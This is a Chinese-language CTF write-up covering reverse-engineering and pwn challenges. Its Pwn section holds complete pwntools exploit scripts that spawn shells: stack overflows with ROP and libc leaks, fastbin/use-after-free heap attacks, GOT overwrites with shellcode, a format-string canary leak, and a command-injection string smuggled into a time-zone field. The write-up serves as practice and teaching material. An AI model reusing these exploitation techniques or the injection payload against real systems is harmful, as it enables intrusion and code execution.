# Re

## re1-100
就换一换字符的位置
```python
t = "daf29f59034938ae4efd53fc275d81053ed5be8c"
v = []
for i in range(4):
	v.append(t[i*10:i*10+10])
flag = v[2]
flag += v[3]
flag += v[0]
flag += v[1]

print flag
```
flag为**53fc275d81053ed5be8cdaf29f59034938ae4efd**

## APK-逆向2

这题名字叫APK逆向，下载下来居然是一个exe文件，神奇，下载下来跑了下
```sh
PS D:\shared\xman\first\re\apk> .\reverse100.exe
Connecting...
Cannot connect!
Fail!
```
发现好像要连接啥，于是拿IDA看了下
```c
.method private static hidebysig void Main(string[] args)
  {
    .entrypoint
    .maxstack 4
    .locals init (string V0,
                  int32 V1,
                  class [System]System.Net.Sockets.TcpClient V2,
                  class [System]System.Net.Sockets.Socket V3,
                  string V4,
                  string V5,
                  char V6,
                  string V7,
                  int32 V8)
    ldstr    a127001                    // "127.0.0.1"
    stloc.0
    ldc.i4   31337
    stloc.1
    newobj   instance void [System]System.Net.Sockets.TcpClient::.ctor()
    stloc.2
```
应该是连接本地的31337端口，然后在本地开了个端口，程序好像直接把flag发过来了
```sh
PS D:\Download\netcat-win32-1.11\netcat-1.11> .\nc64.exe -lvvp 31337
listening on [any] 31337 ...
connect to [127.0.0.1] from DESKTOP-74M889O [127.0.0.1] 53217
CTF{7eb67b0bb4427e0b43b40b6042670b55} sent 0, rcvd 37
PS D:\Download\netcat-win32-1.11\netcat-1.11>
```
flag为 **CTF{7eb67b0bb4427e0b43b40b6042670b55}**
## Shuffle
题目提示说找到字符串在随机化之前。于是IDA打开看了下，直接就能看见flag
**SECCON{Welcome to the SECCON 2014 CTF!}**

## key
这题原先不知道该怎么解，后来动态调了许久，静态看了挺久的，后来发现了和key比较的操作
```c
004020EC  |. /72 13         jb short key.00402101
004020EE  |. |66:90         nop                                      ;  Default case of switch 004020E1
004020F0  |> |8B01          /mov eax,dword ptr ds:[ecx]
004020F2  |. |3B06          |cmp eax,dword ptr ds:[esi]
004020F4  |. |75 10         |jnz short key.00402106
004020F6  |. |83C1 04       |add ecx,0x4
004020F9  |. |83C6 04       |add esi,0x4
004020FC  |. |83EA 04       |sub edx,0x4
004020FF  |.^|73 EF         \jnb short key.004020F0
00402101  |> \83FA FC       cmp edx,-0x4                             ;  Cases 1,2,3 of switch 004020E1
00402104  |.  74 34         je short key.0040213A
```
对应IDA中
```c
    if ( v9 )
    {
LABEL_11:
      if ( v8 == -4 )
        goto LABEL_20;
    }
    else
    {
      while ( *input == *(_DWORD *)v7 )
      {
        ++input;
        v7 += 4;
        v9 = v8 < 4;
        v8 -= 4;
        if ( v9 )
          goto LABEL_11;
      }
    }
```
其中
```c
ds:[005EA960]=0061FEFF
eax=005E5888, (ASCII "idg_cni~bjbfi|gsxb")
跳转来自 004020FF
```
于是得到key 就是 **idg_cni~bjbfi|gsxb**

## serial-150
一个简单的混淆，用IDA的u和c慢慢来就好了，最后得到代码：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed __int64 v3; // rdx
  int result; // eax
  char s[16]; // [rsp+0h] [rbp-200h]
  char v6; // [rsp+100h] [rbp-100h]

  memset(s, 0, 0x100uLL);
  memset(&v6, 0, 0x100uLL);
  std::operator<<<std::char_traits<char>>(&std::cout, "Please Enter the valid key!\n", 32LL);
  std::operator>><char,std::char_traits<char>>(&std::cin, s);
  if ( strlen(s) != 16 )
    goto LABEL_22;
  if ( s[0] != 'E' )
    goto LABEL_22;
  v3 = 'E';
  if ( s[15] != 'V'
    || s[1] != 'Z'
    || (v3 = 'Z', s[14] != 'A')
    || s[2] != '9'
    || (v3 = '9', s[13] != 'b')
    || s[3] != 'd'
    || (v3 = 'd', s[12] != '7')
    || s[4] != 'm'
    || (v3 = 'm', s[11] != 'G')
    || s[5] != 'q'
    || (v3 = 'q', s[10] != '9')
    || s[6] != '4'
    || (v3 = '4', s[9] != 'g')
    || s[7] != 'c'
    || (v3 = 'c', s[8] != '8') )
  {
LABEL_22:
    std::operator<<<std::char_traits<char>>(&std::cout, "Serial number is not valid!\n", v3);
    result = 0;
  }
  else
  {
    std::operator<<<std::char_traits<char>>(&std::cout, "Serial number is valid :)\n", 'c');
    result = 0;
  }
  return result;
}
```
很清晰的，算出flag为 **EZ9dmq4c8g9G7bAV**

## zorropub

根据代码流程，一开始要一个seed，seed的大小区间为[17,0xFFFF]，还要满足
```c
i = seed;
  v9 = 0;
  while ( i )
  {
    ++v9;
    i &= i - 1;
  }
  if ( v9 != 10 )
  {
    puts("Looks like its a dangerous combination of drinks right there.");
    puts("Get Out, you will get yourself killed");
    exit(-1);
  }
```
于是写了个c代码，求出满足seed条件的数
```
#include <stdio.h>
int main(){
	int v9 = 0;
	for(int i = 16;i < 0x10000;i++){
		// printf("0x%x--\n",i);
		int j = i;
		v9 = 0;
		while( j ){
			++v9;
			j &= j - 1;
			if(v9 > 10)
				break;
		}
		if(v9 == 10)
			printf("++%d\n",i);
	}
	printf("++end\n");
	return 0;
}
```
然后是要在这些数中找到满足以下条件的
```c
srand(seed);
  MD5_Init(&v10);
  for ( i = 0; i <= 29; ++i )
  {
    v9 = rand() % 1000;
    sprintf(&s, "%d", v9);
    v3 = strlen(&s);
    MD5_Update(&v10, &s, v3);
    v12[i] = v9 ^ LOBYTE(dword_6020C0[i]);
  }
  v12[i] = 0;
  MD5_Final(v11, &v10);
  for ( i = 0; i <= 15; ++i )
    sprintf(&s1[2 * i], "%02x", (unsigned __int8)v11[i]);
  if ( strcmp(s1, "5eba99aff105c9ff6a1a913e343fec67") )
  {
    puts("Try different mix, This mix is too sloppy");
    exit(-1);
  }
  return printf("\nYou choose right mix and here is your reward: The flag is nullcon{%s}\n", v12);
```
我偷懒，直接选择了爆破，(不知道为啥这题收发好像有问题
```python
from pwn import *
l = [那些数，太多了就不贴了]
#l = l[::-1] 倒着来和正的来，一起跑
for i in l:
	info(str(i))
	p = process("./zorro_bin")
	# p.recvuntil("How many drinks you want?")
	p.sendline('1')
	# p.recvuntil("ids:")
	p.sendline(str(i))
	sleep(0.1)
	t = p.recv()
	# info(t)
	if "flag" in t:
		info(t)
		break
	p.kill()

```
跑啊跑
```shell
[+] Starting local process './zorro_bin': pid 6568
[*] Process './zorro_bin' stopped with exit code 255 (pid 6568)
[*] 59313
[+] Starting local process './zorro_bin': pid 6570
[*] Process './zorro_bin' stopped with exit code 255 (pid 6570)
[*] 59308
[+] Starting local process './zorro_bin': pid 6572
[*] Process './zorro_bin' stopped with exit code 255 (pid 6572)
[*] 59306
[+] Starting local process './zorro_bin': pid 6574
[*] Process './zorro_bin' stopped with exit code 99 (pid 6574)
[*] OK. I need details of all the drinks. Give me 1 drink ids:
    You choose right mix and here is your reward: The flag is nullcon{nu11c0n_s4yz_x0r1n6_1s_4m4z1ng}
```
flag为**nullcon{nu11c0n_s4yz_x0r1n6_1s_4m4z1ng}**

## secret-galaxy-300
这题一开时不知道在干嘛，给了3个二进制文件，还以为时要3个flag拼在一起，后来跑了下发现都一样的，动态调了下出现了这个
```c
19:00c8│   0x60135c (sc) —▸ 0x400a5f ◂— push   r10
1a:00d0│   0x601364 (sc+8) ◂— 0x100007a69 /* 'iz' */
1b:00d8│   0x60136c (sc+16) —▸ 0x601384 (sc+40) ◂— 0x615f736e65696c61 ('aliens_a')
1c:00e0│   0x601374 (sc+24) ◂— 0x0
... ↓
1e:00f0│   0x601384 (sc+40) ◂— 0x615f736e65696c61 ('aliens_a')
1f:00f8│   0x60138c (sc+48) ◂— 're_around_us'
20:0100│   0x601394 (sc+56) ◂— 0x73755f64 /* 'd_us' */
```
flag 就是这个 **aliens_are_around_us**

这个是在libc_csu_gala函数出现的

```c
__int64 _libc_csu_gala()
{
  __int64 result; // rax

  sc.name = (__int64)off_601288;
  sc.zero = (__int64)&byte_601384;
  sc.random_num = 31337;
  sc.flag = 1;
  byte_601384 = off_601268[8];
  byte_601385 = off_601280[7];
  byte_601386 = off_601270[4];
  byte_601387 = off_601268[6];
  byte_601388 = off_601268[1];
  byte_601389 = off_601270[2];
  byte_60138A = '_';
  byte_60138B = off_601268[8];
  byte_60138C = off_601268[3];
  byte_60138D = off_601278[5];
  byte_60138E = '_';
  byte_60138F = off_601268[8];
  byte_601390 = off_601268[3];
  byte_601391 = off_601268[4];
  byte_601392 = off_601280[6];
  byte_601393 = off_601280[4];
  byte_601394 = off_601268[2];
  byte_601395 = '_';
  byte_601396 = off_601280[6];
  result = (unsigned __int8)off_601270[3];
  byte_601397 = off_601270[3];
  byte_601398 = 0;
  return result;
}
```
## babymips

这题，配环境配的都快哭了，最后把自己的虚拟机和服务器全都弄的乱七八糟的，还是没跑起来，无奈只能硬着头皮静态逆了
好在找了个能把mips汇编转成c语言的，好歹比汇编好看些，工具叫retdec，神器
转换后：
```c
// Address range: 0x4007f0 - 0x4009a8
int32_t function_4007f0(int32_t * str) {
    int32_t v1 = (int32_t)str;
    if (strlen((char *)str) > 5) {
        int32_t v2 = 5;
        while (true) {
            char * v3 = (char *)(v2 + v1); // 0x4008a8  v3 --> str[v2]
            int32_t v4 = (int32_t)*v3; // 0x4008a8
            char v5;
            if (v2 % 2 == 0) {
                char v6 = *v3; // 0x4008cc   v6 = str[v2]
                v5 = (int32_t)v6 / 64 | 0x4000000 * v4 / 0x1000000;
				//	 	v6 >> 6  |  (v4 << 26) >> 24
            } else {
                // 0x400828
                v5 = 64 * (int32_t)*v3 | v4 / 4;
            }
            // 0x400900
            *v3 = v5;
            int32_t v7 = v2 + 1; // 0x400908
            if (v7 >= strlen((char *)str)) {
                // break -> 0x400934
                break;
            }
            v2 = v7;
        }
    }
    int32_t str2 = *(int32_t *)&g9; // 0x400944
    int32_t puts_rc;
    if (strncmp((char *)(v1 + 5), (char *)str2, 27) == 0) {
        // 0x400964
        puts_rc = puts("Right!");
    } else {
        // 0x40097c
        puts_rc = puts("Wrong!");
    }
    // 0x40098c
    return puts_rc;
}

// Address range: 0x4009a8 - 0x400af8
int32_t function_4009a8(void) {
    // 0x4009a8
    setbuf(g6, NULL);
    setbuf(g7, NULL);
    printf("Give me your flag:");
    int32_t str; // bp-44
    scanf("%32s", &str);
    int32_t v1 = 0; // bp-48
    int32_t v2 = 0; // 0x400a58
    char * v3 = (char *)(v2 + (int32_t)&v1 + 4); // 0x400a28 v3-->str
    *v3 = (char)((int32_t)*v3 ^ 32 - v2);
    int32_t v4 = v1 + 1; // 0x400a70
    v1 = v4;
    while (v4 < 32) {
        // 0x400a1c
        v2 = v4;
        v3 = (char *)(v2 + (int32_t)&v1 + 4);
        *v3 = (char)((int32_t)*v3 ^ 32 - v2);
        v4 = v1 + 1;
        v1 = v4;
    }
    int32_t str2 = *(int32_t *)&g8; // 0x400a90
    int32_t puts_rc;
    if (strncmp((char *)&str, (char *)str2, 5) == 0) {
        // 0x400ab4
        puts_rc = function_4007f0(&str);
    } else {
        // 0x400acc
        puts_rc = puts("Wrong");
    }
    // 0x400adc
    return puts_rc;
}
char (*g8)[6] = "Q|j{g";
```
这是关键的两个函数，流程大概是这样的
```c
int main(){
	int str[0x40];
	scanf("%32s",str);
	int idx = 0;
	while(idx < 32){
		str[idx] = str[idx]^(0x20-idx);
		idx++;
	}
	if(strncmp(str,g8,5)==0)
		function_4007f0(&str);
	else
		fail();
}

void function_4007f0(char *str){
	int idx = 5;
	char* s = &str[5];
	while(idx < 32){
		if(idx % 2 == 0)
			s[idx] = ((s[idx]&0x3f)<<2)|((s[idx]&0xc0)>>6)
		else
			s[idx] = ((s[idx]&0x3)<<6)|((s[idx]&0xfc)>>2)
		idx++;
	}
	if(strncmp(s,enc,27)==0)
		success();
	else
		fail()
}
其中enc="52FD16A489BD9280134154A08D451881DEFC95F016791A155B751F00".decode('hex')
```
这样子的话只要一个解密脚本就好了
```python
part1 = "Q|j{g"
flag1 = ''
for i in range(5):
	flag1 += chr(ord(part1[i])^(0x20-i))
# print flag1  "qctf{"

part2 = "52FD16A489BD9280134154A08D451881DEFC95F016791A155B751F00".decode('hex')

flag2 = ''
for i in range(27):
	if i % 2 == 0:
		t = bin(ord(part2[i]))[2:].zfill(8)
		t = t[2:]+t[:2]
		flag2 += chr(int(t,2)^(0x20-5-i))
	else:
		t = bin(ord(part2[i]))[2:].zfill(8)
		t = t[6:]+t[:6]
		flag2 += chr(int(t,2)^(0x20-5-i))
# print flag2 ReA11y_4_B@89_mlp5_4_XmAn_}
```
所以flag为 **qctf{ReA11y_4_B@89_mlp5_4_XmAn_}**

# Pwn

## forgots

程序为简单的栈溢出，还给了后门函数可以直接cat flag ，做完才看见（没视力。
```python
from pwn import *

def main(host,port=48942):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./forgot")
		gdb.attach(p,"b *0x08048A61")
	p.recvuntil("What is your name?\n")
	p.sendline("/bin/sh\x00")
	main_addr = 0x80487AA
	sh_addr = 0x80482d6
	system_addr = 0x8048480
	p.recvuntil("> ")
	payload = "@"+"A"*0x1f+p32(0x804862C)*10+"A"*0x20
	payload += p32(2)+"A"*0xc+p32(system_addr)*2
	payload += p32(0xcafebabe)+p32(sh_addr)
	p.sendline(payload)
	p.interactive()
	
if __name__ == "__main__":
	
	main(args['REMOTE'])
```

## pwn100

也是栈溢出，程序有puts函数，先泄露在getshell

```python
from pwn import *


def main(host,port=32952):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./pwn100")
		gdb.attach(p)
	# 0x0000000000400763 : pop rdi ; ret
	p_rdi = 0x0000000000400763
	payload = "A"*0x48+p64(p_rdi)+p64(elf.got["puts"])
	payload += p64(elf.symbols["puts"])+p64(0x40068e)
	p.send(payload.ljust(0xc8,"\x00"))
	p.recvuntil("bye~\n")
	libc.address = u64(p.recv(6).ljust(8,"\x00"))-0x6f690
	payload = "A"*0x48+p64(p_rdi)
	payload += p64(libc.search("/bin/sh\x00").next())+p64(libc.symbols["system"])
	p.send(payload.ljust(0xc8,"\x00"))
	p.interactive()
	
if __name__ == "__main__":
	elf = ELF("./pwn100",checksec=False)
	libc = ELF("./libc.so.6")
	main(args['REMOTE'])
```

## note-service2

- 程序有RWX的段，可以写shellcode
- add的时候没有检查idx的合法性，所以可以用负数的idx覆盖到got表
- 但是一次最多只能读7个字节，后面会有个'\x00'

这个和pwnable.tw上的death_note很像
我的思路是先用shellcode调用read，把真正的shell code在读进去，这样工作量会小一点
劫持的话我选择了free@got，因为这样free的时候，rax会是一个合法的地址，（exp写的有点乱

```python
from pwn import *
context.arch="amd64"

def cmd(t):
	p.recvuntil("your choice>> ")
	p.sendline(str(t))
	
def add(idx,sz,content):
	cmd(1)
	p.sendlineafter("index:",str(idx))
	p.sendlineafter("size:",str(sz))
	p.recvuntil("content:")
	p.sendline(content)
	
def dele(idx):
	cmd(4)
	p.sendlineafter("index:",str(idx))
def main(host,port=44152):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./note_service2")
		gdb.attach(p)
	sc = asm('''
		push rdi
		xor byte ptr[rsp],0x40
		pop rsi
	''')
	add(-17,8,sc)
	sc = asm("""
		or dl,0xff
		push rbx
		pop rdi
		push rbx
	""")
	add(0,8,sc)
	sc = asm("""
		xor rax,rax
		syscall
	""")
	add(1,8,sc)
	add(2,8,"\x00"*6)
	dele(2)
	pause()
	sc = "\x90"*0x30+asm(shellcraft.sh())
	p.send(sc)
	p.interactive()
	
if __name__ == "__main__":

	main(args['REMOTE'])

```

## time_fomatter

这题有意思啊，原先还想着怎么利用UAF，想fastbin attack，后面怎么都不成功，想了好久，后面试着瞎搞下那个命令，成功了

```python
from pwn import *

def cmd(command):
	p.recvuntil("> ")
	p.sendline(str(command))

def set_time_format(fmt):
	cmd(1)
	p.recvuntil("Format: ")
	p.sendline(fmt)
def set_time_zone(tzone):
	cmd(3)
	p.recvuntil("Time zone: ")
	p.sendline(tzone)

def show():
	cmd(4)

def set_a_time(v):
	cmd(2)
	p.recvuntil("Enter your unix time: ")
	p.sendline(str(v))
def quit():
	cmd(5)
	p.recvuntil("Are you sure you want to exit (y/N)? ")
	p.sendline("n")

def main(host,port=8888):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./time_formatter")
		gdb.attach(p,"b *0x400ADE")
	set_time_format("aa")
	quit()
	set_a_time(0xcafebabe)
	set_time_zone("';cat ./flag'")
	show()
	p.interactive()
	
if __name__ == "__main__":
	
	main(args['REMOTE'])

```

## 4-ReeHY-main-100

UAF && Fastbin attack 然后劫持整个数组

```python
from pwn import *

def cmd(command):
	p.recvuntil("$ ")
	p.sendline(str(command))

def edit(idx,content):
	cmd(3)
	p.sendlineafter("Chose one to edit",str(idx))
	p.sendafter("content",content)

def add(sz,idx,content):
	cmd(1)
	p.sendlineafter("Input size\n",str(sz))
	p.sendlineafter("Input cun\n",str(idx))
	p.sendafter("Input content",content)

def delete(idx):
	cmd(2)
	p.sendlineafter("Chose one to dele\n",str(idx))

def show():
	cmd(4)

def main(host,port=49231):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./4-ReeHY-main")
		
	p.sendlineafter("$ ","/bin/sh\x00")
	add(0x68,0,"A"*0x68)
	add(0x68,1,"B"*0x68)
	delete(0)
	delete(1)
	delete(0)
	add(0x68,0,p64(0x60209d))
	add(0x68,0,"A"*0x8)
	add(0x68,0,"A"*0x8)
	payload = "\x00"*0x3+p32(0x100)*4+p64(0x6020b0)+p64(0)*3+p64(0x6020e0)+p64(1)
	payload += p64(elf.got["free"])+p64(1)+p64(0x6020e0)+p64(1)
	add(0x68,0,payload.ljust(0x68,"\x00"))
	edit(1,p64(elf.symbols["puts"]))
	edit(2,p64(elf.got["atoi"]))
	delete(0)
	# gdb.attach(p,"b *0x400CA8")
	libc.address = u64(p.recv(6).ljust(8,"\x00"))-0x36e80
	info("libc : " + hex(libc.address))
	edit(2,p64(elf.got["atoi"])+p64(1))
	edit(0,p64(libc.symbols["system"]))
	p.recvuntil("$ ")
	p.sendline("/bin/sh")
	p.interactive()
	
if __name__ == "__main__":
	elf = ELF("./4-ReeHY-main",checksec=False)
	libc = ELF("./libc-2.23.so",checksec=False)
	main(args['REMOTE'])
```

## babyfengshui

这题想吐槽一下给的附件，给的libc的版本居然是2.19的，一开始LD_PRELOAD不行，没有对应版本的ld,然后去编译了半天，结果打的时候发现服务器是libc2.23的，太秀了
程序在add的时候的对description size的检查是有问题的

```c
unsigned int __cdecl update(unsigned __int8 idx)
{
  char v2; // [esp+17h] [ebp-11h]
  int length; // [esp+18h] [ebp-10h]
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  if ( idx < (unsigned __int8)count && ptr[idx] )
  {
    length = 0;
    printf("text length: ");
    __isoc99_scanf("%u%c", &length, &v2);
    if ( length + ptr[idx]->descrip >= (unsigned int)&ptr[idx][0xFFFFFFFF].name[0x78] )
    {
      puts("my l33t defenses cannot be fooled, cya!");
      exit(1);
    }
    printf("text: ");
    read_n((char *)ptr[idx]->descrip, length + 1);
  }
  return __readgsdword(0x14u) ^ v4;
}
```
那个对length的检查只有当note和description地址相邻的时候管用，所以可以先释放一个note，然后在申请一个大一点的，就可以绕过这个检查，溢出覆盖到下一个note

```python

from pwn import *

def cmd(command):
	p.recvuntil("Action: ")
	p.sendline(str(command))


def add(desc_size, name, text_len, text):
	cmd(0)
	p.recvuntil(": ")
	p.sendline(str(desc_size))
	p.recvuntil(": ")
	p.sendline(name)
	p.recvuntil(": ")
	p.sendline(str(text_len))
	p.recvuntil(": ")
	p.sendline(text)

def delete(idx):
	cmd(1)
	p.recvuntil(": ")
	p.sendline(str(idx))

def display(idx):
	cmd(2)
	p.recvuntil(": ")
	p.sendline(str(idx))
	

def update(idx, text_len, text):
	cmd(3)
	p.recvuntil(": ")
	p.sendline(str(idx))
	p.recvuntil(": ")
	p.sendline(str(text_len))
	p.recvuntil(": ")
	p.sendline(text)
	

def main(host,port=50556):
	global p
	if host:
		p = remote(host,port)
	else:
		# p = process("./babyfengshui")
		p = process("./babyfengshui",env={"LD_PRELOAD":"./libc-2.23.so"})
		# gdb.attach(p,"b *0x8048ACB")
	add(0x10,"A"*0x7b,0x8,"a"*0x7)
	add(0x10,"B"*0x7b,0x8,"b"*0x7)
	delete(0)
	add(0x80,"C"*8,0xb0,"C"*0x98+p32(0)+p32(0x89)+p32(elf.got["free"]))
	display(1)
	p.recvuntil("description: ")
	libc.address = u32(p.recv(4))-libc.symbols["free"]
	info("libc : " + hex(libc.address))
	
	payload = "/bin/sh\x00"+"C"*0x90+p32(0)+p32(0x89)
	payload += p32(libc.symbols["__free_hook"])
	
	update(2,0xb0,payload)
	update(1,0x9000000,p32(libc.symbols["system"])) #0x9000000 for bypass check
	delete(2)
	p.interactive()
	
if __name__ == "__main__":
	elf = ELF("./babyfengshui",checksec=False)
	libc = ELF("./libc-2.23.so",checksec=False)
	# libc = ELF("./libc.so.6",checksec=False)
	main(args['REMOTE'])

```

## Mary_Morton

这题一开始也没看见后门，执行system("/bin/sh")一直失败，后来看了下是哪里调用的system，看见了后门。（太傻逼了我

```python

from pwn import *


def main(host,port=33253):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("MaryMorton")
		gdb.attach(p,"b *0x00040087A")
	p.recvuntil("3. Exit the battle ")
	p.sendline(str(2))
	pause()
	p.sendline("%p--%23$p++")
	stack = int(p.recvuntil("--",drop=True),16)
	info("stack : " + hex(stack))
	canary = int(p.recvuntil("++",drop=True),16)
	info("canary : " + hex(canary))
	p.recvuntil("3. Exit the battle ")
	p.sendline(str(1))
	pause()
	payload = "/bin/sh\x00"*17+p64(canary)+p64(0xcafebabedeadbeef)
	payload += p64(0x4008DA)
	p.sendline(payload)
	p.interactive()
	
if __name__ == "__main__":
	elf = ELF("./MaryMorton")
	main(args['REMOTE'])

```

## warmup

瞒打，给了个地址，直接爆栈溢出长度就好了

```python
from pwn import *

def main(host,port=43052):
	for i in range(0x20):
		p = remote(host,port)
		p.recvuntil(">")
		p.sendline("A"*(i*4)+p64(0x40060d))
		try:
			p.sendline("ls")
			data = p.recv()
			info("padding: " + hex(i))
		except:
			p.close()
	
if __name__ == "__main__":
	main(args['REMOTE'])
```

## 1000levels

这题挺难的，搞了巨久才出来。利用点为

- 未初始化变量
- vsyscall
- 栈溢出

先说这个未初始化变量

```c
 hint            proc near               ; CODE XREF: main:loc_F9F↓p
.text:0000000000000D06
.text:0000000000000D06 var_110         = qword ptr -110h
.text:0000000000000D06 anonymous_0     = dword ptr -100h
.text:0000000000000D06 anonymous_1     = word ptr -0FCh
.text:0000000000000D06
.text:0000000000000D06 ; __unwind {
.text:0000000000000D06                 push    rbp
.text:0000000000000D07                 mov     rbp, rsp
.text:0000000000000D0A                 sub     rsp, 110h
.text:0000000000000D11                 mov     rax, cs:system_ptr
.text:0000000000000D18                 mov     [rbp+var_110], rax
```
hint函数会把system的地址写入到rbp-0x110的地址，虽然后面我们无法打印这个，但是这个值留在了栈上，然后是

```c
int go()
{
  int v1; // ST0C_4
  __int64 v2; // [rsp+0h] [rbp-120h]
  __int64 v3; // [rsp+0h] [rbp-120h]
  int v4; // [rsp+8h] [rbp-118h]
  __int64 v5; // [rsp+10h] [rbp-110h]
  signed __int64 level; // [rsp+10h] [rbp-110h]
  signed __int64 v7; // [rsp+18h] [rbp-108h]
  __int64 v8; // [rsp+20h] [rbp-100h]

  puts("How many levels?");
  v2 = get_int();
  if ( v2 > 0 )
    v5 = v2;
  else
    puts("Coward");
  puts("Any more?");
  v3 = get_int();
  level = v5 + v3;
  if ( level > 0 )
  {
    if ( level <= 99 )
    {
      v7 = level;
    }
    else
    {
      puts("You are being a real man.");
      v7 = 100LL;
    }
```
我们可以看到level也是存在rbp-0x110的地方，所以为了不破坏存在栈中的system地址，v2应小于0，然后在让v3为system函数和one_gadget的偏移，这样rbp-0x110的地方就为one_gadget的地址了,后面只要通过99关，在最后100关的时候栈溢出就可以了

```
from pwn import *

def cmd(t):
	p.recvuntil("Choice:")
	p.sendline(str(t))
	
def go(level,anymore=0,buf=''):
	cmd(1)
	p.recvuntil("How many levels?")
	p.sendline(str(level))
	p.recvuntil("?")
	p.sendline(str(anymore))
	if level != 0:
		p.recvuntil("Answer:")
		p.send(buf)

def hint():
	cmd(2)

def main(host,port=36609):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./100levels",env={"LD_PRELOAD":"./libc.so"})
		gdb.attach(p)
	vsyscall = 0xffffffffff600400
	
	# 0x4526a	execve("/bin/sh", rsp+0x30, environ)
	# constraints:
	# [rsp+0x30] == NULL

	offset = -0x126
	hint()
	go(0,-0x126)
	for i in range(99):
		p.recvuntil("Question: ")
		t1 = int(p.recvuntil(' ',drop=True))
		p.recvuntil(' ')
		t2 = int(p.recvuntil(' ',drop=True))
		p.recvuntil("Answer:")
		p.sendline(str(t1*t2))
	# pause()
	payload = "A"*0x38+p64(vsyscall)*3
	p.recvuntil("Answer:")
	p.send(payload)
	p.interactive()
			
	
if __name__ == "__main__":
	main(args['REMOTE'])
```

## dice_game

这题原先是hacknote，没给二进制程序文件，但是还是有几十个人解了，然后我也把我祖传的hacknote exp打了一波，也成功了，太秀了
后来换上了这题，这题只要猜中随机数50次就可以拿到flag，而且前面有个栈溢出可以直接覆盖种子
写了个吐随机数的c程序t

```python
from pwn import *


def main(host,port=46621):
	global p
	if host:
		p = remote(host,port)
		p2 = process("t")
	else:
		p = process("dice_game")
		p2 = process("t")
		gdb.attach(p)
	p.recvuntil("Welcome, let me know your name: ")
	p.send("A"*0x40+p32(0x11112222))
	v = []
	for i in range(50):
		p2.recvuntil("-")
		v.append(int(p2.recvuntil("\n",drop=True)))
	for i in range(50):
		p.recvuntil("Give me the point(1~6): ")
		p.sendline(str(v[i]))
	p.interactive()
	
if __name__ == "__main__":
	main(args['REMOTE'])
```

# Misc

## easycap

wireshark打开，追踪了下TCP流，得到flag
**FLAG:385b87afc8671dee07550290d16a8071**

